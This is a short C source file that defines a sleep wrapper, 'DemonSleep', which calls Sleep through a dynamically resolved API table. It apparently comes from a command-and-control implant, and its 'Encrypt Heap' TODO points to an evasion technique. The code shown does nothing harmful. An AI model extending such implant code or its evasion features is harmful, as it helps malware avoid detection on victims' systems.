#include "Common.h"

VOID DemonSleep( DWORD dwMilliseconds ) {
	// TODO: Encrypt Heap
	if (DemonInstance.api.Sleep) {
		CALL_API( Sleep, dwMilliseconds );
	}
};